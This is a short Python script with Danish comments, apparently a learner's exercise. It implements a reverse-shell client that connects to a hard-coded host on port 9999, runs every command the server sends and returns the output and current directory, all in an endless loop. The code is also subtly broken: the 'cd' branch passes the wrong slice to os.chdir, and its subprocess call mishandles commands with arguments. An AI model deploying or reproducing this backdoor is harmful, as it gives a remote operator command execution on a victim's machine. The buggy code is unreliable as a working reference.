# Naar klienten koerer skal den forbinde sig til serveren
# Naar den er forbundet skal den vente paa en kommando fra serveren
# Naar den modtager en kommando fra serveren skal den koerer kommandoen
# Og sende resultatet tilbage til serveren
#======================================================================================================================

# bibloteker som er nodvendige 
import os #<---- tillader at tilgaa et system
import socket #<------ gor det muligt at lave en socket forbindelse
import subprocess #<---- goer det muligt at integrere shellkommandoer i mit script, mens jeg administrere input / output
#======================================================================================================================

#lav en socket
sock = socket.socket()
host = '192.168.128.219'
port = 9999
#============================
#bind alle elementerne sammen!
sock.connect((host, port))
#============================

#naar programmet korer er det hensigten, at den konstant skal lytte efter en kommando fra serveren
#derfor laver jeg et uendeligt while true-loop

while True:
	data = sock.recv(1024)#<---1024 = buffersize
	#check om de forste 2 karaktere er; 'cd'
	#naar man bruger cd som kommando er der ikke et direkte output
	#fordi at man navigere rundt i systemet. 
	if data[:2].decode('utf-8') == 'cd':
		#os = tilgaa systemet. chdir = change directory
		os.chdir(data[:3].decode('utf-8'))# efter cd, tag da den tredje karakter og skriv resten.
		#Paa denne maade er det muligt at skrive cd "NYTORD".

	#check om der overhovedet er data som bliver sendt.
	if len(data) > 0:
		#Popen = Process open
		#shell=False / kan man se terminalen paa klientes side, sandt eller falsk
		#tager et hvert output og piper det ud i en standard stream. 
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		#mit output er som defualt bytes. jeg oensker at output som baade bytes og string som datatyper.

		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_string = str(output_bytes, 'utf-8')
		sock.send(str.encode(output_string + str(os.getcwd()) + '> ')) #<... os.getcwd = tilgaa OS + 'get current working directory'
		#print(output_string) <---- dette vil blive vist paa klientes side.
sock.close()



		





